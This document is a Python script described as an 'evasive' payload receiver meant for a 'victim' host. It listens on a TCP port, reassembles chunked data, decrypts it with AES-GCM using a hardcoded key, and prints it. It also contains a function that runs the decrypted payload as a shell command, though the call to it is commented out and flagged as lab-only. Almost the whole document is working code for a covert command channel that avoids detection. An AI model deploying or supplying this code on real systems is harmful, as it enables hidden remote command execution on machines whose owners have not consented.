#!/usr/bin/env python3
"""
Evasive Payload Receiver Script (AES + Chunking)
Runs on Receiver (e.g., Victim1 192.168.100.101).

Listens for incoming TCP connections, receives chunked/encrypted data,
reassembles it, decrypts using AES-GCM, and prints the original payload.
Optional execution is heavily discouraged unless in a secure, isolated lab.
"""
import socket
import struct
import subprocess # For optional execution

# WARNING: Ensure necessary imports for Crypto library
try:
    from Crypto.Cipher import AES
except ImportError:
    print("[!] Error: PyCryptodome not installed.")
    print("Run: pip install pycryptodome")
    exit(1)


# --- Configuration ---
LISTEN_IP = "0.0.0.0"          # Listen on all available interfaces
# LISTEN_IP = "192.168.100.101" # Or bind to a specific interface IP
LISTEN_PORT = 4445             # Must match the sender's target port

# WARNING: Hardcoded key is insecure! Use the SAME key as the sender.
AES_KEY = b'YourSecretKey1234567890123456789' # Must match sender

# Header format: Must match sender
LENGTH_HEADER_FORMAT = '!I'
LENGTH_HEADER_SIZE = struct.calcsize(LENGTH_HEADER_FORMAT)

# AES-GCM constants (assuming 128-bit tag, 16-byte nonce typical for PyCryptodome GCM)
NONCE_SIZE = 16 # Bytes
TAG_SIZE = 16   # Bytes
# --------------------

def receive_chunked_data(conn):
    """Receives length-prefixed chunks and reassembles data."""
    full_data = bytearray() # Use bytearray for efficient concatenation
    print("[*] Waiting to receive data chunks...")
    while True:
        try:
            # 1. Receive the length header
            length_header = conn.recv(LENGTH_HEADER_SIZE)
            if not length_header:
                # Sender closed connection cleanly before sending more data
                print("[*] Sender closed connection (no more length headers).")
                break
            if len(length_header) < LENGTH_HEADER_SIZE:
                print("[!] Received incomplete length header. Connection issue?")
                return None

            chunk_len = struct.unpack(LENGTH_HEADER_FORMAT, length_header)[0]
            # print(f"[D] Received length header: {chunk_len}") # Debug

            # 2. Receive the data chunk based on the received length
            chunk = b''
            bytes_to_receive = chunk_len
            while len(chunk) < chunk_len:
                 part = conn.recv(bytes_to_receive - len(chunk))
                 if not part:
                      print("[!] Connection closed unexpectedly while receiving chunk data.")
                      return None # Indicate error
                 chunk += part
            # print(f"[D] Received chunk: {len(chunk)} bytes") # Debug
            full_data.extend(chunk)

        except ConnectionResetError:
            print("[!] Connection reset by peer.")
            return None
        except struct.error as e:
             print(f"[!] Struct unpacking error (invalid header?): {e}")
             return None
        except Exception as e:
            print(f"[!] Error receiving data: {e}")
            return None # General error

    print(f"[*] Finished receiving data ({len(full_data)} bytes total).")
    return bytes(full_data) # Convert back to bytes

def decrypt_payload(key, encrypted_data):
    """Decrypts data using AES-GCM, verifying the tag."""
    if len(encrypted_data) < NONCE_SIZE + TAG_SIZE:
        print("[!] Received data is too short to contain nonce, tag, and ciphertext.")
        return None

    # Extract nonce, tag, and ciphertext based on expected order/sizes
    nonce = encrypted_data[:NONCE_SIZE]
    tag = encrypted_data[NONCE_SIZE:NONCE_SIZE + TAG_SIZE]
    ciphertext = encrypted_data[NONCE_SIZE + TAG_SIZE:]

    print(f"[D] Received Nonce: {nonce.hex()}")
    print(f"[D] Received Tag:   {tag.hex()}")

    try:
        cipher = AES.new(key, AES.MODE_GCM, nonce=nonce)
        decrypted_data = cipher.decrypt_and_verify(ciphertext, tag)
        return decrypted_data.decode('utf-8')
    except ValueError as e:
        # This commonly occurs if the key is wrong or the data/tag is corrupt/tampered
        print(f"[!] Decryption/Verification failed: {e}. Check AES key or data integrity.")
        return None
    except Exception as e:
        print(f"[!] Decryption failed with unexpected error: {e}")
        return None

def execute_payload(payload_command):
    """ DANGEROUS: Executes the received command """
    print("\n--- EXECUTING RECEIVED PAYLOAD ---")
    try:
        # Use subprocess for better control than os.system
        result = subprocess.run(payload_command, shell=True, capture_output=True, text=True, check=False)
        print("STDOUT:")
        print(result.stdout if result.stdout else "<None>")
        print("STDERR:")
        print(result.stderr if result.stderr else "<None>")
        print(f"Return Code: {result.returncode}")
    except Exception as e:
        print(f"[!] Exception during payload execution: {e}")
    print("--- PAYLOAD EXECUTION FINISHED ---\n")


def main():
    # Create a TCP server socket
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        # Allow address reuse quickly after script termination
        server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        try:
            server.bind((LISTEN_IP, LISTEN_PORT))
            server.listen(1)
            print(f"[*] Listening on {LISTEN_IP}:{LISTEN_PORT}...")
        except Exception as e:
            print(f"[!] Failed to bind or listen on {LISTEN_IP}:{LISTEN_PORT}: {e}")
            return

        # Accept ONE connection for this simple example
        try:
             conn, addr = server.accept()
        except Exception as e:
             print(f"[!] Failed to accept connection: {e}")
             return

        with conn:
            print(f"[+] Connection established from {addr}")

            # Receive the complete encrypted data
            encrypted_data = receive_chunked_data(conn)

            if encrypted_data:
                print("[*] Decrypting payload...")
                decrypted_payload = decrypt_payload(AES_KEY, encrypted_data)

                if decrypted_payload:
                    print("\n**************************************")
                    print("[*] Successfully Decrypted Payload:")
                    print(decrypted_payload)
                    print("**************************************\n")

                    # --- !!! DANGER ZONE !!! ---
                    # Uncomment the line below ONLY if you are in a secure lab
                    # and understand the EXTREME risks of executing arbitrary code.
                    # execute_payload(decrypted_payload)
                    # --- !!! END DANGER ZONE !!! ---

                else:
                    print("[!] Payload decryption failed.")
            else:
                 print("[!] Failed to receive complete data.")


if __name__ == '__main__':
    main()
